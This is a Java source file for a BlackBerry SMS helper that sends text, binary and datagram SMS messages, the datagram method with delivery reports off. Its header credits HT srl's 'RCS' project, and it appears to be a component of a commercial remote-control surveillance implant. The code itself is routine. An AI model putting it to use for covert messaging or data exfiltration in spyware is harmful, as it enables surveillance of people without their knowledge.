//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.sms
 * File         : SMSHelper.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.sms;

import java.io.IOException;
import java.io.InterruptedIOException;

import javax.microedition.io.Connector;
import javax.microedition.io.Datagram;
import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import net.rim.device.api.io.SmsAddress;
import net.rim.device.api.system.SMSPacketHeader;
import net.rim.device.api.system.SMSParameters;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class SMSHelper {
    //#ifdef DEBUG
    static Debug debug = new Debug("SMSHelper", DebugLevel.VERBOSE);
    //#endif

    private static final int MAX_LEN_UCS2 = 70;
    private static final int MAX_LEN_8BIT = 70;

    public static boolean sendSMSText(final String number, final String message) {

        //#ifdef DEBUG
        debug.info("Sending sms Message to: " + number + " message:" + message);
        //#endif
        try {
            final MessageConnection conn = (MessageConnection) Connector
                    .open("sms://");
            // generate a new text message
            final TextMessage tmsg = (TextMessage) conn
                    .newMessage(MessageConnection.TEXT_MESSAGE);
            // set the message text and the address
            tmsg.setAddress("sms://" + number);

            tmsg.setPayloadText(message);
            // finally send our message

            conn.send(tmsg);
        } catch (final InterruptedIOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send message sms to: " + number + " ex:" + e);
            //#endif
            return false;
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send message sms to: " + number + " ex:" + e);
            //#endif
            return false;
        }
        return true;
    }

    public static boolean sendSMSBinary(final String number,
            final String message) {

        //#ifdef DEBUG
        debug.info("Sending sms Message to: " + number + " message:" + message);
        //#endif
        try {
            final MessageConnection conn = (MessageConnection) Connector
                    .open("sms://");
            // generate a new text message
            final BinaryMessage bmsg = (BinaryMessage) conn
                    .newMessage(MessageConnection.BINARY_MESSAGE);
            // set the message text and the address
            bmsg.setAddress("sms://" + number);

            //tmsg.getAddress();
            //SMSPacketHeader smsPacketHeader = smsAddress.getHeader(); 

            bmsg.setPayloadData(message.getBytes("UTF-8"));
            // finally send our message

            conn.send(bmsg);
        } catch (final InterruptedIOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send message sms to: " + number + " ex:" + e);
            //#endif
            return false;
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send message sms to: " + number + " ex:" + e);
            //#endif
            return false;
        }
        return true;
    }

    public static boolean sendSMSDatagram(final String number,
            final String message) {

        //#ifdef DEBUG
        debug
                .info("Sending sms Datagram to: " + number + " message:"
                        + message);
        //#endif
        try {
            final DatagramConnection conn = (DatagramConnection) Connector
                    .open("sms://" + number);

            final SmsAddress destinationAddr = new SmsAddress("//" + number);
            final SMSPacketHeader header = destinationAddr.getHeader();
            // no need for the report
            header.setStatusReportRequest(false);
            // we are going to use the UDH
            header.setUserDataHeaderPresent(true);
            // setting the validity and delivery periods
            header.setValidityPeriod(SMSParameters.PERIOD_INDEFINITE);
            header.setDeliveryPeriod(SMSParameters.PERIOD_INDEFINITE);
            // setting the message class
            header.setMessageClass(SMSParameters.MESSAGE_CLASS_1);
            // setting the message encoding - we are going to send UTF-8 characters so
            // it has to be 8-bit
            header.setMessageCoding(SMSParameters.MESSAGE_CODING_8_BIT);

            final byte[] data = message.getBytes("UTF-8");

            final Datagram dg = conn.newDatagram(conn.getMaximumLength());
            dg.setData(data, 0, Math.min(data.length, MAX_LEN_8BIT));
            conn.send(dg);

        } catch (final InterruptedIOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send Datagram sms to: " + number + " ex:" + e);
            //#endif
            return false;
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("Cannot send Datagram sms to: " + number + " ex:" + e);
            //#endif
            return false;
        }
        return true;
    }
}
